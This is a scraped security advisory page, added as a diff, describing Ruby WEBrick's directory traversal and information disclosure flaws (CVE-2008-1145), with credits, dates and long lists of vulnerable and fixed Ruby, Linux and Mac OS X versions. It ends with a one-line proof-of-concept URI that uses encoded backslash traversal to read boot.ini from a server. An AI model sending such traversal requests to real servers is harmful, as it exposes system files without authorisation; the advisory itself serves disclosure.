@@ -1,0 +1,453 @@
+#SpeeDr00t@Black Falcon<br>#bid28123<p><b><span style="font-size: 18pt;">Ruby WEBrick Remote Directory Traversal and Information Disclosure Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/28123/info">info</a><br><a href="http://www.securityfocus.com/bid/28123/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/28123/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/28123/solution">solution</a><br><a href="http://www.securityfocus.com/bid/28123/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				28123
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Unknown
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2008-1145<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Mar 06 2008 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Apr 13 2015 09:17PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Alexandr Polyakov and Stas Svistunovich of Digital Security Research Group reported these issues to the vendor.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Yukihiro Matsumoto Ruby 1.9 <br/>
+					
+				
+					Yukihiro Matsumoto Ruby 1.8.6 <br/>
+					
+				
+					Yukihiro Matsumoto Ruby 1.8.5 -p2<br/>
+					
+				
+					Yukihiro Matsumoto Ruby 1.8.5 <br/>
+					
+				
+					Yukihiro Matsumoto Ruby 1.8.4 <br/>
+					
+				
+					Yukihiro Matsumoto Ruby 1.8.3 <br/>
+					
+				
+					Yukihiro Matsumoto Ruby 1.8.2 pre4<br/>
+<span class="related">
+						
+							+ 
+						
+						Gentoo Linux  <br/>
+</span>
+					
+				
+					Yukihiro Matsumoto Ruby 1.8.2  pre3<br/>
+<span class="related">
+						
+							+ 
+						
+						Gentoo Linux  <br/>
+</span>
+					
+				
+					Yukihiro Matsumoto Ruby 1.8.2  pre2<br/>
+					
+				
+					Yukihiro Matsumoto Ruby 1.8.2  pre1<br/>
+					
+				
+					Yukihiro Matsumoto Ruby 1.8.2 <br/>
+<span class="related">
+						
+							+ 
+						
+						Redhat Fedora  Core4<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Redhat Fedora  Core3<br/>
+</span>
+					
+				
+					Yukihiro Matsumoto Ruby 1.8.1 <br/>
+<span class="related">
+						
+							+ 
+						
+						Redhat Fedora  Core3<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Redhat Fedora  Core2<br/>
+</span>
+					
+				
+					Yukihiro Matsumoto Ruby 1.8 <br/>
+<span class="related">
+						
+							+ 
+						
+						Redhat Fedora  Core3<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Ubuntu Ubuntu Linux 5.0 4 powerpc<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Ubuntu Ubuntu Linux 5.0 4 i386<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Ubuntu Ubuntu Linux 5.0 4 amd64<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Ubuntu Ubuntu Linux 4.1 ppc<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Ubuntu Ubuntu Linux 4.1 ia64<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Ubuntu Ubuntu Linux 4.1 ia32<br/>
+</span>
+					
+				
+					Yukihiro Matsumoto Ruby 1.6.8 <br/>
+					
+				
+					Yukihiro Matsumoto Ruby 1.6.7 <br/>
+<span class="related">
+						
+							+ 
+						
+						Debian Linux 3.0  sparc<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Debian Linux 3.0  s/390<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Debian Linux 3.0  ppc<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Debian Linux 3.0  mipsel<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Debian Linux 3.0  mips<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Debian Linux 3.0  m68k<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Debian Linux 3.0  ia-64<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Debian Linux 3.0  ia-32<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Debian Linux 3.0  hppa<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Debian Linux 3.0  arm<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Debian Linux 3.0  alpha<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Debian Linux 3.0 <br/>
+</span>
+					
+				
+					Yukihiro Matsumoto Ruby 1.6 <br/>
+					
+				
+					SuSE SUSE Linux Enterprise Server  9 SP3<br/>
+					
+				
+					SuSE SUSE Linux Enterprise Server  10 SP2<br/>
+					
+				
+					SuSE SUSE Linux Enterprise Server  10 SP1<br/>
+					
+				
+					SuSE SUSE Linux Enterprise Server  10<br/>
+					
+				
+					SuSE Suse Linux Enterprise Desktop  10 SP2<br/>
+					
+				
+					SuSE Suse Linux Enterprise Desktop  10 SP1<br/>
+					
+				
+					SuSE Suse Linux Enterprise Desktop  10<br/>
+					
+				
+					SuSE Linux Desktop  10<br/>
+					
+				
+					S.u.S.E. SUSE LINUX Retail Solution 8.0 <br/>
+					
+				
+					S.u.S.E. SuSE Linux Openexchange Server 4.0 <br/>
+					
+				
+					S.u.S.E. SuSE Linux Open-Xchange 4.1 <br/>
+					
+				
+					S.u.S.E. openSUSE  11.0<br/>
+					
+				
+					S.u.S.E. openSUSE  10.3<br/>
+					
+				
+					S.u.S.E. openSUSE  10.2<br/>
+					
+				
+					S.u.S.E. Novell Linux Desktop 9.0 <br/>
+					
+				
+					S.u.S.E. Linux Professional  10.2 X86 64<br/>
+					
+				
+					S.u.S.E. Linux Professional  10.2<br/>
+					
+				
+					S.u.S.E. Linux Professional  10.1<br/>
+					
+				
+					S.u.S.E. Linux Personal  10.2 X86 64<br/>
+					
+				
+					S.u.S.E. Linux Personal  10.2<br/>
+					
+				
+					S.u.S.E. Linux Personal  10.1<br/>
+					
+				
+					S.u.S.E. Linux Enterprise Server for S/390 9.0 <br/>
+					
+				
+					S.u.S.E. Linux Enterprise Server for S/390  <br/>
+					
+				
+					S.u.S.E. Linux  10.1 x86-64<br/>
+					
+				
+					S.u.S.E. Linux  10.1 x86<br/>
+					
+				
+					S.u.S.E. Linux  10.1 ppc<br/>
+					
+				
+					rPath rPath Linux  1<br/>
+					
+				
+					rPath Appliance Platform Linux Service  1<br/>
+					
+				
+					Redhat Fedora  7<br/>
+					
+				
+					Metasploit Project Metasploit Framework  3.1<br/>
+					
+				
+					Metasploit Project Metasploit Framework  3.0<br/>
+					
+				
+					Mandriva Linux Mandrake  2008.0 x86_64<br/>
+					
+				
+					Mandriva Linux Mandrake  2008.0<br/>
+					
+				
+					Mandriva Linux Mandrake  2007.1 x86_64<br/>
+					
+				
+					Mandriva Linux Mandrake  2007.1<br/>
+					
+				
+					MandrakeSoft Corporate Server 4.0 x86_64<br/>
+					
+				
+					MandrakeSoft Corporate Server 3.0  x86_64<br/>
+					
+				
+					MandrakeSoft Corporate Server 3.0 <br/>
+					
+				
+					MandrakeSoft Corporate Server  4.0<br/>
+					
+				
+					Apple Mac OS X Server 10.5.3 <br/>
+					
+				
+					Apple Mac OS X Server 10.5.2 <br/>
+					
+				
+					Apple Mac OS X Server 10.5.1 <br/>
+					
+				
+					Apple Mac OS X Server 10.4.11 <br/>
+					
+				
+					Apple Mac OS X Server  10.5<br/>
+					
+				
+					Apple Mac OS X 10.5.3 <br/>
+					
+				
+					Apple Mac OS X 10.5.2 <br/>
+					
+				
+					Apple Mac OS X 10.5.1 <br/>
+					
+				
+					Apple Mac OS X 10.4.11 <br/>
+					
+				
+					Apple Mac OS X  10.5<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					Yukihiro Matsumoto Ruby 1.9 -1<br/>
+					
+				
+					Yukihiro Matsumoto Ruby 1.8.6 -p114<br/>
+					
+				
+					Yukihiro Matsumoto Ruby 1.8.5 -p115<br/>
+					
+				
+					Apple Mac OS X Server 10.5.4 <br/>
+					
+				
+					Apple Mac OS X 10.5.4 <br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	The following proof-of-concept URI is available for the directory-traversal vulnerability:<br/><br/>http://www.example.com/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/boot.ini
+	
+		<ul>
+</ul>
+</div>
